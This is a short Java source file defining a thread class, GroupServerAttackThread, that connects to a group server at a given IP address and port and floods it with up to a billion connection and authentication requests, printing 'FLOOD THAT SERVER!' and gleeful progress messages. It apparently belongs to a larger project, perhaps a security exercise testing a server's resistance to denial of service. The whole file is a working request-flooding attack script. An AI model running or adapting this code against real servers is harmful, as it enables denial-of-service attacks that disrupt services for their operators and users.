import java.util.*;
public class GroupServerAttackThread extends Thread {
	String ip, validUser;
	int port;
	public GroupServerAttackThread(String in1, int in2, String in3) {
		ip = in1;
		port = in2;
		validUser = in3;
	}
	public void run(){
	    GroupClient gc = new GroupClient();
		System.out.println("1..2..3.. FLOOD THAT SERVER!");
           for (int i = 0; i < 1000000000; i++) {
               if(gc.connect(ip, port)) {
				if(i%100 == 0) {
					System.out.println("flooded another 100 requests :)");
				}
                   gc.authenticateUser(validUser);
               }
           }
	}
}